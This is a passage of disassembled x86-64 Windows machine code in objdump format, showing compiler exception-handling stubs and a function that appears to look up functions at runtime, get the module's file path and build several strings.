   14000c707:	75 1f                	jne    0x14000c728
   14000c709:	e8 02 6f ff ff       	call   0x140003610
   14000c70e:	c7 80 c0 02 00 00 01 	movl   $0x1,0x2c0(%rax)
   14000c715:	00 00 00 
   14000c718:	c7 45 20 01 00 00 00 	movl   $0x1,0x20(%rbp)
   14000c71f:	c7 45 30 01 00 00 00 	movl   $0x1,0x30(%rbp)
   14000c726:	eb 07                	jmp    0x14000c72f
   14000c728:	c7 45 30 00 00 00 00 	movl   $0x0,0x30(%rbp)
   14000c72f:	8b 45 30             	mov    0x30(%rbp),%eax
   14000c732:	48 83 c4 20          	add    $0x20,%rsp
   14000c736:	5d                   	pop    %rbp
   14000c737:	c3                   	ret
   14000c738:	cc                   	int3
   14000c739:	cc                   	int3
   14000c73a:	cc                   	int3
   14000c73b:	cc                   	int3
   14000c73c:	cc                   	int3
   14000c73d:	cc                   	int3
   14000c73e:	cc                   	int3
   14000c73f:	cc                   	int3
   14000c740:	cc                   	int3
   14000c741:	cc                   	int3
   14000c742:	cc                   	int3
   14000c743:	cc                   	int3
   14000c744:	cc                   	int3
   14000c745:	40 53                	rex push %rbx
   14000c747:	55                   	push   %rbp
   14000c748:	48 83 ec 28          	sub    $0x28,%rsp
   14000c74c:	48 8b ea             	mov    %rdx,%rbp
   14000c74f:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   14000c753:	e8 bc e3 ff ff       	call   0x14000ab14
   14000c758:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   14000c75c:	75 4a                	jne    0x14000c7a8
   14000c75e:	41 b8 63 73 6d e0    	mov    $0xe06d7363,%r8d
   14000c764:	48 8b 9d d8 00 00 00 	mov    0xd8(%rbp),%rbx
   14000c76b:	44 39 03             	cmp    %r8d,(%rbx)
   14000c76e:	75 38                	jne    0x14000c7a8
   14000c770:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000c774:	75 32                	jne    0x14000c7a8
   14000c776:	81 7b 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rbx)
   14000c77d:	74 12                	je     0x14000c791
   14000c77f:	81 7b 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rbx)
   14000c786:	74 09                	je     0x14000c791
   14000c788:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   14000c78f:	75 17                	jne    0x14000c7a8
   14000c791:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000c795:	e8 46 e3 ff ff       	call   0x14000aae0
   14000c79a:	85 c0                	test   %eax,%eax
   14000c79c:	74 0a                	je     0x14000c7a8
   14000c79e:	b2 01                	mov    $0x1,%dl
   14000c7a0:	48 8b cb             	mov    %rbx,%rcx
   14000c7a3:	e8 34 e9 ff ff       	call   0x14000b0dc
   14000c7a8:	e8 63 6e ff ff       	call   0x140003610
   14000c7ad:	48 8b 8d e0 00 00 00 	mov    0xe0(%rbp),%rcx
   14000c7b4:	48 89 88 f0 00 00 00 	mov    %rcx,0xf0(%rax)
   14000c7bb:	e8 50 6e ff ff       	call   0x140003610
   14000c7c0:	48 8b 8d e8 00 00 00 	mov    0xe8(%rbp),%rcx
   14000c7c7:	48 89 88 f8 00 00 00 	mov    %rcx,0xf8(%rax)
   14000c7ce:	48 83 c4 28          	add    $0x28,%rsp
   14000c7d2:	5d                   	pop    %rbp
   14000c7d3:	5b                   	pop    %rbx
   14000c7d4:	c3                   	ret
   14000c7d5:	cc                   	int3
   14000c7d6:	cc                   	int3
   14000c7d7:	cc                   	int3
   14000c7d8:	cc                   	int3
   14000c7d9:	cc                   	int3
   14000c7da:	cc                   	int3
   14000c7db:	cc                   	int3
   14000c7dc:	cc                   	int3
   14000c7dd:	cc                   	int3
   14000c7de:	cc                   	int3
   14000c7df:	cc                   	int3
   14000c7e0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000c7e5:	55                   	push   %rbp
   14000c7e6:	48 83 ec 20          	sub    $0x20,%rsp
   14000c7ea:	48 8b ea             	mov    %rdx,%rbp
   14000c7ed:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   14000c7f4:	48 89 95 88 00 00 00 	mov    %rdx,0x88(%rbp)
   14000c7fb:	48 ff c2             	inc    %rdx
   14000c7fe:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   14000c805:	e8 56 51 ff ff       	call   0x140001960
   14000c80a:	48 89 45 20          	mov    %rax,0x20(%rbp)
   14000c80e:	48 8d 05 d1 50 ff ff 	lea    -0xaf2f(%rip),%rax        # 0x1400018e6
   14000c815:	48 83 c4 20          	add    $0x20,%rsp
   14000c819:	5d                   	pop    %rbp
   14000c81a:	c3                   	ret
   14000c81b:	cc                   	int3
   14000c81c:	cc                   	int3
   14000c81d:	cc                   	int3
   14000c81e:	cc                   	int3
   14000c81f:	cc                   	int3
   14000c820:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000c825:	53                   	push   %rbx
   14000c826:	55                   	push   %rbp
   14000c827:	48 83 ec 28          	sub    $0x28,%rsp
   14000c82b:	48 8b ea             	mov    %rdx,%rbp
   14000c82e:	48 8b 9d 80 00 00 00 	mov    0x80(%rbp),%rbx
   14000c835:	48 83 7b 20 10       	cmpq   $0x10,0x20(%rbx)
   14000c83a:	72 09                	jb     0x14000c845
   14000c83c:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000c840:	e8 ab 53 ff ff       	call   0x140001bf0
   14000c845:	48 c7 43 20 0f 00 00 	movq   $0xf,0x20(%rbx)
   14000c84c:	00 
   14000c84d:	33 c9                	xor    %ecx,%ecx
   14000c84f:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
   14000c853:	88 4b 08             	mov    %cl,0x8(%rbx)
   14000c856:	33 d2                	xor    %edx,%edx
   14000c858:	e8 a3 6b ff ff       	call   0x140003400
   14000c85d:	90                   	nop
   14000c85e:	48 83 c4 28          	add    $0x28,%rsp
   14000c862:	5d                   	pop    %rbp
   14000c863:	5b                   	pop    %rbx
   14000c864:	c3                   	ret
   14000c865:	cc                   	int3
   14000c866:	cc                   	int3
   14000c867:	cc                   	int3
   14000c868:	cc                   	int3
   14000c869:	cc                   	int3
   14000c86a:	cc                   	int3
   14000c86b:	cc                   	int3
   14000c86c:	cc                   	int3
   14000c86d:	cc                   	int3
   14000c86e:	cc                   	int3
   14000c86f:	cc                   	int3
   14000c870:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000c875:	53                   	push   %rbx
   14000c876:	55                   	push   %rbp
   14000c877:	56                   	push   %rsi
   14000c878:	57                   	push   %rdi
   14000c879:	41 54                	push   %r12
   14000c87b:	41 55                	push   %r13
   14000c87d:	41 56                	push   %r14
   14000c87f:	41 57                	push   %r15
   14000c881:	48 83 ec 38          	sub    $0x38,%rsp
   14000c885:	48 8b ea             	mov    %rdx,%rbp
   14000c888:	48 8d 0d b9 38 00 00 	lea    0x38b9(%rip),%rcx        # 0x140010148
   14000c88f:	ff 15 6b 17 00 00    	call   *0x176b(%rip)        # 0x14000e000
   14000c895:	48 8b f8             	mov    %rax,%rdi
   14000c898:	48 8d 0d b9 38 00 00 	lea    0x38b9(%rip),%rcx        # 0x140010158
   14000c89f:	ff 15 5b 17 00 00    	call   *0x175b(%rip)        # 0x14000e000
   14000c8a5:	48 8d 15 bc 38 00 00 	lea    0x38bc(%rip),%rdx        # 0x140010168
   14000c8ac:	48 8b cf             	mov    %rdi,%rcx
   14000c8af:	ff 15 53 17 00 00    	call   *0x1753(%rip)        # 0x14000e008
   14000c8b5:	4c 8b f0             	mov    %rax,%r14
   14000c8b8:	48 c7 85 68 02 00 00 	movq   $0xf,0x268(%rbp)
   14000c8bf:	0f 00 00 00 
   14000c8c3:	45 33 ff             	xor    %r15d,%r15d
   14000c8c6:	4c 89 bd 60 02 00 00 	mov    %r15,0x260(%rbp)
   14000c8cd:	44 88 bd 50 02 00 00 	mov    %r15b,0x250(%rbp)
   14000c8d4:	48 c7 85 88 00 00 00 	movq   $0xf,0x88(%rbp)
   14000c8db:	0f 00 00 00 
   14000c8df:	4c 89 bd 80 00 00 00 	mov    %r15,0x80(%rbp)
   14000c8e6:	44 88 7d 70          	mov    %r15b,0x70(%rbp)
   14000c8ea:	48 c7 85 a0 01 00 00 	movq   $0xf,0x1a0(%rbp)
   14000c8f1:	0f 00 00 00 
   14000c8f5:	4c 89 bd 98 01 00 00 	mov    %r15,0x198(%rbp)
   14000c8fc:	44 88 bd 88 01 00 00 	mov    %r15b,0x188(%rbp)
   14000c903:	48 c7 85 18 02 00 00 	movq   $0xf,0x218(%rbp)
   14000c90a:	0f 00 00 00 
   14000c90e:	4c 89 bd 10 02 00 00 	mov    %r15,0x210(%rbp)
   14000c915:	44 88 bd 00 02 00 00 	mov    %r15b,0x200(%rbp)
   14000c91c:	48 c7 45 60 0f 00 00 	movq   $0xf,0x60(%rbp)
   14000c923:	00 
   14000c924:	4c 89 7d 58          	mov    %r15,0x58(%rbp)
   14000c928:	44 88 7d 48          	mov    %r15b,0x48(%rbp)
   14000c92c:	33 c9                	xor    %ecx,%ecx
   14000c92e:	e8 c1 54 ff ff       	call   0x140001df4
   14000c933:	48 8b d8             	mov    %rax,%rbx
   14000c936:	44 88 bd 80 04 00 00 	mov    %r15b,0x480(%rbp)
   14000c93d:	33 d2                	xor    %edx,%edx
   14000c93f:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   14000c945:	48 8d 8d 81 04 00 00 	lea    0x481(%rbp),%rcx
   14000c94c:	e8 1f 61 ff ff       	call   0x140002a70
   14000c951:	44 88 bd 70 03 00 00 	mov    %r15b,0x370(%rbp)
   14000c958:	33 d2                	xor    %edx,%edx
   14000c95a:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   14000c960:	48 8d 8d 71 03 00 00 	lea    0x371(%rbp),%rcx
   14000c967:	e8 04 61 ff ff       	call   0x140002a70
   14000c96c:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   14000c972:	48 8d 95 80 04 00 00 	lea    0x480(%rbp),%rdx
   14000c979:	33 c9                	xor    %ecx,%ecx
   14000c97b:	ff 15 8f 16 00 00    	call   *0x168f(%rip)        # 0x14000e010
   14000c981:	41 8d 57 5c          	lea    0x5c(%r15),%edx
   14000c985:	48 8d 8d 80 04 00 00 	lea    0x480(%rbp),%rcx
   14000c98c:	e8 c3 54 ff ff       	call   0x140001e54
   14000c991:	4c 8b d8             	mov    %rax,%r11
   14000c994:	33 c0                	xor    %eax,%eax
   14000c996:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000c99a:	49 8d 7b 01          	lea    0x1(%r11),%rdi
   14000c99e:	f2 ae                	repnz scas (%rdi),%al
   14000c9a0:	48 f7 d1             	not    %rcx
   14000c9a3:	48 ff c9             	dec    %rcx
   14000c9a6:	48 63 c9             	movslq %ecx,%rcx
   14000c9a9:	42 0f be 7c 19 fc    	movsbl -0x4(%rcx,%r11,1),%edi
   14000c9af:	88 85 90 05 00 00    	mov    %al,0x590(%rbp)
   14000c9b5:	33 d2                	xor    %edx,%edx
   14000c9b7:	41 b8 03 01 00 00    	mov    $0x103,%r8d
   14000c9bd:	48 8d 8d 91 05 00 00 	lea    0x591(%rbp),%rcx
   14000c9c4:	e8 a7 60 ff ff       	call   0x140002a70
   14000c9c9:	48 c7 85 78 01 00 00 	movq   $0xf,0x178(%rbp)
   14000c9d0:	0f 00 00 00 
   14000c9d4:	4c 89 bd 70 01 00 00 	mov    %r15,0x170(%rbp)
   14000c9db:	44 88 bd 60 01 00 00 	mov    %r15b,0x160(%rbp)
   14000c9e2:	45 8d 47 03          	lea    0x3(%r15),%r8d
   14000c9e6:	48 8d 15 8b 37 00 00 	lea    0x378b(%rip),%rdx        # 0x140010178
   14000c9ed:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   14000c9f4:	e8 e7 4a ff ff       	call   0x1400014e0
   14000c9f9:	90                   	nop
   14000c9fa:	45 8d 47 0b          	lea    0xb(%r15),%r8d
   14000c9fe:	48 8d 15 7b 37 00 00 	lea    0x377b(%rip),%rdx        # 0x140010180
   14000ca05:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   14000ca0c:	e8 5f 49 ff ff       	call   0x140001370
   14000ca11:	45 8d 47 11          	lea    0x11(%r15),%r8d
   14000ca15:	48 8d 15 74 37 00 00 	lea    0x3774(%rip),%rdx        # 0x140010190
   14000ca1c:	48 8d 8d 58 01 00 00 	lea    0x158(%rbp),%rcx
   14000ca23:	e8 48 49 ff ff       	call   0x140001370
   14000ca28:	48 c7 85 50 01 00 00 	movq   $0xf,0x150(%rbp)
   14000ca2f:	0f 00 00 00 
   14000ca33:	4c 89 bd 48 01 00 00 	mov    %r15,0x148(%rbp)
   14000ca3a:	44 88 bd 38 01 00 00 	mov    %r15b,0x138(%rbp)
   14000ca41:	45 8d 47 03          	lea    0x3(%r15),%r8d
   14000ca45:	48 8d 15 2c 37 00 00 	lea    0x372c(%rip),%rdx        # 0x140010178
   14000ca4c:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   14000ca53:	e8 88 4a ff ff       	call   0x1400014e0
   14000ca58:	90                   	nop
   14000ca59:	45 8d 47 0b          	lea    0xb(%r15),%r8d
   14000ca5d:	48 8d 15 1c 37 00 00 	lea    0x371c(%rip),%rdx        # 0x140010180
   14000ca64:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   14000ca6b:	e8 00 49 ff ff       	call   0x140001370
   14000ca70:	45 8d 47 0d          	lea    0xd(%r15),%r8d
   14000ca74:	48 8d 15 2d 37 00 00 	lea    0x372d(%rip),%rdx        # 0x1400101a8
   14000ca7b:	48 8d 8d 30 01 00 00 	lea    0x130(%rbp),%rcx
   14000ca82:	e8 e9 48 ff ff       	call   0x140001370
   14000ca87:	48 8d 95 60 01 00 00 	lea    0x160(%rbp),%rdx
   14000ca8e:	48 83 bd 78 01 00 00 	cmpq   $0x10,0x178(%rbp)
   14000ca95:	10 
   14000ca96:	48 0f 43 95 60 01 00 	cmovae 0x160(%rbp),%rdx
   14000ca9d:	00 
   14000ca9e:	44 8b c7             	mov    %edi,%r8d
   14000caa1:	44 8b cb             	mov    %ebx,%r9d
   14000caa4:	48 8d 8d 90 05 00 00 	lea    0x590(%rbp),%rcx
   14000caab:	e8 10 4f ff ff       	call   0x1400019c0
   14000cab0:	44 8b c3             	mov    %ebx,%r8d
   14000cab3:	48 8d 15 fe 36 00 00 	lea    0x36fe(%rip),%rdx        # 0x1400101b8
   14000caba:	48 8d 8d 70 03 00 00 	lea    0x370(%rbp),%rcx
   14000cac1:	e8 fa 4e ff ff       	call   0x1400019c0
   14000cac6:	44 88 bd 38 03 00 00 	mov    %r15b,0x338(%rbp)
   14000cacd:	33 c0                	xor    %eax,%eax
   14000cacf:	48 89 85 39 03 00 00 	mov    %rax,0x339(%rbp)
   14000cad6:	48 89 85 41 03 00 00 	mov    %rax,0x341(%rbp)
   14000cadd:	48 89 85 49 03 00 00 	mov    %rax,0x349(%rbp)
   14000cae4:	48 89 85 51 03 00 00 	mov    %rax,0x351(%rbp)
   14000caeb:	48 89 85 59 03 00 00 	mov    %rax,0x359(%rbp)
   14000caf2:	48 89 85 61 03 00 00 	mov    %rax,0x361(%rbp)
   14000caf9:	88 85 69 03 00 00    	mov    %al,0x369(%rbp)
   14000caff:	88 85 90 02 00 00    	mov    %al,0x290(%rbp)
   14000cb05:	48 89 85 91 02 00 00 	mov    %rax,0x291(%rbp)
   14000cb0c:	48 89 85 99 02 00 00 	mov    %rax,0x299(%rbp)
   14000cb13:	48 89 85 a1 02 00 00 	mov    %rax,0x2a1(%rbp)
   14000cb1a:	48 89 85 a9 02 00 00 	mov    %rax,0x2a9(%rbp)
   14000cb21:	48 89 85 b1 02 00 00 	mov    %rax,0x2b1(%rbp)
   14000cb28:	48 89 85 b9 02 00 00 	mov    %rax,0x2b9(%rbp)
   14000cb2f:	88 85 c1 02 00 00    	mov    %al,0x2c1(%rbp)
   14000cb35:	88 85 00 03 00 00    	mov    %al,0x300(%rbp)
   14000cb3b:	48 89 85 01 03 00 00 	mov    %rax,0x301(%rbp)
   14000cb42:	48 89 85 09 03 00 00 	mov    %rax,0x309(%rbp)
   14000cb49:	48 89 85 11 03 00 00 	mov    %rax,0x311(%rbp)
   14000cb50:	48 89 85 19 03 00 00 	mov    %rax,0x319(%rbp)
   14000cb57:	48 89 85 21 03 00 00 	mov    %rax,0x321(%rbp)
   14000cb5e:	48 89 85 29 03 00 00 	mov    %rax,0x329(%rbp)
   14000cb65:	88 85 31 03 00 00    	mov    %al,0x331(%rbp)
   14000cb6b:	88 85 c8 02 00 00    	mov    %al,0x2c8(%rbp)
   14000cb71:	48 89 85 c9 02 00 00 	mov    %rax,0x2c9(%rbp)
   14000cb78:	48 89 85 d1 02 00 00 	mov    %rax,0x2d1(%rbp)
   14000cb7f:	48 89 85 d9 02 00 00 	mov    %rax,0x2d9(%rbp)
   14000cb86:	48 89 85 e1 02 00 00 	mov    %rax,0x2e1(%rbp)
   14000cb8d:	48 89 85 e9 02 00 00 	mov    %rax,0x2e9(%rbp)
   14000cb94:	48 89 85 f1 02 00 00 	mov    %rax,0x2f1(%rbp)
   14000cb9b:	88 85 f9 02 00 00    	mov    %al,0x2f9(%rbp)
   14000cba1:	8d 48 64             	lea    0x64(%rax),%ecx
   14000cba4:	e8 43 52 ff ff       	call   0x140001dec
   14000cba9:	48 8b d8             	mov    %rax,%rbx
   14000cbac:	41 8d 4f 64          	lea    0x64(%r15),%ecx
   14000cbb0:	e8 37 52 ff ff       	call   0x140001dec
   14000cbb5:	48 8b f0             	mov    %rax,%rsi
   14000cbb8:	41 8d 4f 64          	lea    0x64(%r15),%ecx
   14000cbbc:	e8 2b 52 ff ff       	call   0x140001dec
   14000cbc1:	4c 8b e0             	mov    %rax,%r12
   14000cbc4:	41 8d 4f 64          	lea    0x64(%r15),%ecx
   14000cbc8:	e8 1f 52 ff ff       	call   0x140001dec
   14000cbcd:	4c 8b e8             	mov    %rax,%r13
   14000cbd0:	48 8d 95 70 03 00 00 	lea    0x370(%rbp),%rdx
   14000cbd7:	48 8d 8d 70 03 00 00 	lea    0x370(%rbp),%rcx
   14000cbde:	48 8b c3             	mov    %rbx,%rax
   14000cbe1:	48 2b c1             	sub    %rcx,%rax
   14000cbe4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000cbeb:	00 00 00 00 00 
   14000cbf0:	0f b6 0a             	movzbl (%rdx),%ecx
   14000cbf3:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   14000cbf6:	48 ff c2             	inc    %rdx
   14000cbf9:	84 c9                	test   %cl,%cl
   14000cbfb:	75 f3                	jne    0x14000cbf0
   14000cbfd:	48 8d 8d 70 03 00 00 	lea    0x370(%rbp),%rcx
   14000cc04:	48 8d 85 70 03 00 00 	lea    0x370(%rbp),%rax
   14000cc0b:	48 8b d6             	mov    %rsi,%rdx
   14000cc0e:	48 2b d0             	sub    %rax,%rdx
   14000cc11:	0f b6 01             	movzbl (%rcx),%eax
   14000cc14:	88 04 0a             	mov    %al,(%rdx,%rcx,1)
   14000cc17:	48 ff c1             	inc    %rcx
   14000cc1a:	84 c0                	test   %al,%al
   14000cc1c:	75 f3                	jne    0x14000cc11
   14000cc1e:	48 8d 8d 70 03 00 00 	lea    0x370(%rbp),%rcx
   14000cc25:	48 8d 85 70 03 00 00 	lea    0x370(%rbp),%rax
   14000cc2c:	49 8b d4             	mov    %r12,%rdx
   14000cc2f:	48 2b d0             	sub    %rax,%rdx
   14000cc32:	0f b6 01             	movzbl (%rcx),%eax
   14000cc35:	88 04 0a             	mov    %al,(%rdx,%rcx,1)
   14000cc38:	48 ff c1             	inc    %rcx
   14000cc3b:	84 c0                	test   %al,%al
   14000cc3d:	75 f3                	jne    0x14000cc32
   14000cc3f:	48 8d 8d 70 03 00 00 	lea    0x370(%rbp),%rcx
   14000cc46:	48 8d 85 70 03 00 00 	lea    0x370(%rbp),%rax
   14000cc4d:	49 8b d5             	mov    %r13,%rdx
   14000cc50:	48 2b d0             	sub    %rax,%rdx
   14000cc53:	0f b6 01             	movzbl (%rcx),%eax
   14000cc56:	88 04 0a             	mov    %al,(%rdx,%rcx,1)
   14000cc59:	48 ff c1             	inc    %rcx
   14000cc5c:	84 c0                	test   %al,%al
   14000cc5e:	75 f3                	jne    0x14000cc53
   14000cc60:	48 c7 85 28 01 00 00 	movq   $0xf,0x128(%rbp)
   14000cc67:	0f 00 00 00 
   14000cc6b:	4c 89 bd 20 01 00 00 	mov    %r15,0x120(%rbp)
   14000cc72:	88 85 10 01 00 00    	mov    %al,0x110(%rbp)
   14000cc78:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cc7e:	48 8d 15 4f 35 00 00 	lea    0x354f(%rip),%rdx        # 0x1400101d4
   14000cc85:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   14000cc8c:	e8 4f 48 ff ff       	call   0x1400014e0
   14000cc91:	90                   	nop
   14000cc92:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cc98:	48 8d 15 39 35 00 00 	lea    0x3539(%rip),%rdx        # 0x1400101d8
   14000cc9f:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   14000cca6:	e8 c5 46 ff ff       	call   0x140001370
   14000ccab:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000ccb1:	48 8d 15 24 35 00 00 	lea    0x3524(%rip),%rdx        # 0x1400101dc
   14000ccb8:	48 8d 8d 08 01 00 00 	lea    0x108(%rbp),%rcx
   14000ccbf:	e8 ac 46 ff ff       	call   0x140001370
   14000ccc4:	48 c7 85 c8 01 00 00 	movq   $0xf,0x1c8(%rbp)
   14000cccb:	0f 00 00 00 
   14000cccf:	4c 89 bd c0 01 00 00 	mov    %r15,0x1c0(%rbp)
   14000ccd6:	c6 85 b0 01 00 00 00 	movb   $0x0,0x1b0(%rbp)
   14000ccdd:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000cce3:	48 8d 15 f6 34 00 00 	lea    0x34f6(%rip),%rdx        # 0x1400101e0
   14000ccea:	48 8d 8d a8 01 00 00 	lea    0x1a8(%rbp),%rcx
   14000ccf1:	e8 ea 47 ff ff       	call   0x1400014e0
   14000ccf6:	90                   	nop
   14000ccf7:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000ccfd:	48 8d 15 e0 34 00 00 	lea    0x34e0(%rip),%rdx        # 0x1400101e4
   14000cd04:	48 8d 8d a8 01 00 00 	lea    0x1a8(%rbp),%rcx
   14000cd0b:	e8 60 46 ff ff       	call   0x140001370
   14000cd10:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cd16:	48 8d 15 cb 34 00 00 	lea    0x34cb(%rip),%rdx        # 0x1400101e8
   14000cd1d:	48 8d 8d a8 01 00 00 	lea    0x1a8(%rbp),%rcx
   14000cd24:	e8 47 46 ff ff       	call   0x140001370
   14000cd29:	48 c7 85 d8 00 00 00 	movq   $0xf,0xd8(%rbp)
   14000cd30:	0f 00 00 00 
   14000cd34:	4c 89 bd d0 00 00 00 	mov    %r15,0xd0(%rbp)
   14000cd3b:	c6 85 c0 00 00 00 00 	movb   $0x0,0xc0(%rbp)
   14000cd42:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000cd48:	48 8d 15 9d 34 00 00 	lea    0x349d(%rip),%rdx        # 0x1400101ec
   14000cd4f:	48 8d 8d b8 00 00 00 	lea    0xb8(%rbp),%rcx
   14000cd56:	e8 85 47 ff ff       	call   0x1400014e0
   14000cd5b:	90                   	nop
   14000cd5c:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   14000cd62:	48 8d 15 8f 34 00 00 	lea    0x348f(%rip),%rdx        # 0x1400101f8
   14000cd69:	48 8d 8d b8 00 00 00 	lea    0xb8(%rbp),%rcx
   14000cd70:	e8 fb 45 ff ff       	call   0x140001370
   14000cd75:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cd7b:	48 8d 15 66 34 00 00 	lea    0x3466(%rip),%rdx        # 0x1400101e8
   14000cd82:	48 8d 8d b8 00 00 00 	lea    0xb8(%rbp),%rcx
   14000cd89:	e8 e2 45 ff ff       	call   0x140001370
   14000cd8e:	48 c7 85 00 01 00 00 	movq   $0xf,0x100(%rbp)
   14000cd95:	0f 00 00 00 
   14000cd99:	4c 89 bd f8 00 00 00 	mov    %r15,0xf8(%rbp)
   14000cda0:	c6 85 e8 00 00 00 00 	movb   $0x0,0xe8(%rbp)
   14000cda7:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000cdad:	48 8d 15 4c 34 00 00 	lea    0x344c(%rip),%rdx        # 0x140010200
   14000cdb4:	48 8d 8d e0 00 00 00 	lea    0xe0(%rbp),%rcx
   14000cdbb:	e8 20 47 ff ff       	call   0x1400014e0
   14000cdc0:	90                   	nop
   14000cdc1:	41 b8 07 00 00 00    	mov    $0x7,%r8d
   14000cdc7:	48 8d 15 3a 34 00 00 	lea    0x343a(%rip),%rdx        # 0x140010208
   14000cdce:	48 8d 8d e0 00 00 00 	lea    0xe0(%rbp),%rcx
   14000cdd5:	e8 96 45 ff ff       	call   0x140001370
   14000cdda:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000cde0:	48 8d 15 01 34 00 00 	lea    0x3401(%rip),%rdx        # 0x1400101e8
   14000cde7:	48 8d 8d e0 00 00 00 	lea    0xe0(%rbp),%rcx
   14000cdee:	e8 7d 45 ff ff       	call   0x140001370
   14000cdf3:	4c 8d 9d 10 01 00 00 	lea    0x110(%rbp),%r11
   14000cdfa:	48 83 bd 28 01 00 00 	cmpq   $0x10,0x128(%rbp)
   14000ce01:	10 
   14000ce02:	4c 0f 43 9d 10 01 00 	cmovae 0x110(%rbp),%r11
   14000ce09:	00 
   14000ce0a:	48 8d bd 38 03 00 00 	lea    0x338(%rbp),%rdi
   14000ce11:	33 c0                	xor    %eax,%eax
   14000ce13:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000ce17:	f2 ae                	repnz scas (%rdi),%al
   14000ce19:	33 c9                	xor    %ecx,%ecx
   14000ce1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000ce20:	41 0f b6 04 0b       	movzbl (%r11,%rcx,1),%eax
   14000ce25:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000ce29:	48 ff c1             	inc    %rcx
   14000ce2c:	84 c0                	test   %al,%al
   14000ce2e:	75 f0                	jne    0x14000ce20
   14000ce30:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   14000ce37:	48 83 bd c8 01 00 00 	cmpq   $0x10,0x1c8(%rbp)
   14000ce3e:	10 
   14000ce3f:	48 0f 43 95 b0 01 00 	cmovae 0x1b0(%rbp),%rdx
   14000ce46:	00 
   14000ce47:	48 8d bd 90 02 00 00 	lea    0x290(%rbp),%rdi
   14000ce4e:	33 c0                	xor    %eax,%eax
   14000ce50:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000ce54:	f2 ae                	repnz scas (%rdi),%al
   14000ce56:	33 c9                	xor    %ecx,%ecx
   14000ce58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000ce5f:	00 
   14000ce60:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   14000ce64:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000ce68:	48 ff c1             	inc    %rcx
   14000ce6b:	84 c0                	test   %al,%al
   14000ce6d:	75 f1                	jne    0x14000ce60
   14000ce6f:	48 8d 95 c0 00 00 00 	lea    0xc0(%rbp),%rdx
   14000ce76:	48 83 bd d8 00 00 00 	cmpq   $0x10,0xd8(%rbp)
   14000ce7d:	10 
   14000ce7e:	48 0f 43 95 c0 00 00 	cmovae 0xc0(%rbp),%rdx
   14000ce85:	00 
   14000ce86:	48 8d bd 00 03 00 00 	lea    0x300(%rbp),%rdi
   14000ce8d:	33 c0                	xor    %eax,%eax
   14000ce8f:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000ce93:	f2 ae                	repnz scas (%rdi),%al
   14000ce95:	33 c9                	xor    %ecx,%ecx
   14000ce97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000ce9e:	00 00 
   14000cea0:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   14000cea4:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000cea8:	48 ff c1             	inc    %rcx
   14000ceab:	84 c0                	test   %al,%al
   14000cead:	75 f1                	jne    0x14000cea0
   14000ceaf:	48 8d 95 e8 00 00 00 	lea    0xe8(%rbp),%rdx
   14000ceb6:	48 83 bd 00 01 00 00 	cmpq   $0x10,0x100(%rbp)
   14000cebd:	10 
   14000cebe:	48 0f 43 95 e8 00 00 	cmovae 0xe8(%rbp),%rdx
   14000cec5:	00 
   14000cec6:	48 8d bd c8 02 00 00 	lea    0x2c8(%rbp),%rdi
   14000cecd:	33 c0                	xor    %eax,%eax
   14000cecf:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   14000ced3:	f2 ae                	repnz scas (%rdi),%al
   14000ced5:	33 c9                	xor    %ecx,%ecx
   14000ced7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000cede:	00 00 
   14000cee0:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   14000cee4:	88 44 0f ff          	mov    %al,-0x1(%rdi,%rcx,1)
   14000cee8:	48 ff c1             	inc    %rcx
   14000ceeb:	84 c0                	test   %al,%al
